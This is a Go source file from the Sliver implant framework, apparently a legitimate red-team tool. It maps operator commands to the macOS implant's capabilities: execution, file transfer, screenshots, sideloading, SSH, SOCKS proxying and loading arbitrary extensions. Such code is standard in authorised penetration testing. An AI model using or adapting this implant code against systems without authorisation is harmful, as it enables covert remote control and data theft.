package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"github.com/bishopfox/sliver/implant/sliver/extension"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

var (
	darwinHandlers = map[uint32]RPCHandler{
		pb.MsgPsReq:             psHandler,
		pb.MsgTerminateReq:      terminateHandler,
		pb.MsgPing:              pingHandler,
		pb.MsgLsReq:             dirListHandler,
		pb.MsgDownloadReq:       downloadHandler,
		pb.MsgUploadReq:         uploadHandler,
		pb.MsgCdReq:             cdHandler,
		pb.MsgPwdReq:            pwdHandler,
		pb.MsgRmReq:             rmHandler,
		pb.MsgMkdirReq:          mkdirHandler,
		pb.MsgIfconfigReq:       ifconfigHandler,
		pb.MsgExecuteReq:        executeHandler,
		sliverpb.MsgEnvReq:      getEnvHandler,
		sliverpb.MsgSetEnvReq:   setEnvHandler,
		sliverpb.MsgUnsetEnvReq: unsetEnvHandler,

		pb.MsgScreenshotReq:    screenshotHandler,
		sliverpb.MsgNetstatReq: netstatHandler,

		pb.MsgSideloadReq: sideloadHandler,

		sliverpb.MsgReconnectIntervalReq: reconnectIntervalHandler,
		sliverpb.MsgPollIntervalReq:      pollIntervalHandler,
		sliverpb.MsgSSHCommandReq:        runSSHCommandHandler,

		// Extensions
		sliverpb.MsgRegisterExtensionReq: registerExtensionHandler,
		sliverpb.MsgCallExtensionReq:     callExtensionHandler,
		sliverpb.MsgListExtensionsReq:    listExtensionsHandler,

		// {{if .Config.WGc2Enabled}}
		// Wireguard specific
		sliverpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
		sliverpb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
		sliverpb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
		sliverpb.MsgWGStartSocksReq:     wgStartSocksHandler,
		sliverpb.MsgWGStopSocksReq:      wgStopSocksHandler,
		sliverpb.MsgWGListSocksReq:      wgListSocksServersHandler,
		// {{end}}
	}

	darwinPivotHandlers = map[uint32]PivotHandler{}
)

// GetSystemHandlers - Returns a map of the darwin system handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return darwinHandlers
}

// GetSystemPivotHandlers - Returns a map of the darwin system handlers
func GetSystemPivotHandlers() map[uint32]PivotHandler {
	return darwinPivotHandlers
}

// Extensions

func registerExtensionHandler(data []byte, resp RPCResponse) {
	registerReq := &sliverpb.RegisterExtensionReq{}

	err := proto.Unmarshal(data, registerReq)
	if err != nil {
		return
	}

	ext := extension.NewDarwinExtension(registerReq.Data, registerReq.Name, registerReq.OS, registerReq.Init)
	extension.Add(ext)
	err = ext.Load()
	registerResp := &sliverpb.RegisterExtension{
		Response: &commonpb.Response{},
	}
	if err != nil {
		registerResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(registerResp)
	resp(data, err)
}

func callExtensionHandler(data []byte, resp RPCResponse) {
	callReq := &sliverpb.CallExtensionReq{}

	err := proto.Unmarshal(data, callReq)
	if err != nil {
		return
	}

	callResp := &sliverpb.CallExtension{
		Response: &commonpb.Response{},
	}
	gotOutput := false
	err = extension.Run(callReq.Name, callReq.Export, callReq.Args, func(out []byte) {
		gotOutput = true
		callResp.Output = out
		data, err = proto.Marshal(callResp)
		resp(data, err)
	})
	// Only send back synchronously if there was an error
	if err != nil || !gotOutput {
		if err != nil {
			callResp.Response.Err = err.Error()
		}
		data, err = proto.Marshal(callResp)
		resp(data, err)
	}
}

func listExtensionsHandler(data []byte, resp RPCResponse) {
	lstReq := &sliverpb.ListExtensionsReq{}
	err := proto.Unmarshal(data, lstReq)
	if err != nil {
		return
	}

	exts := extension.List()
	lstResp := &sliverpb.ListExtensions{
		Response: &commonpb.Response{},
		Names:    exts,
	}
	data, err = proto.Marshal(lstResp)
	resp(data, err)
}
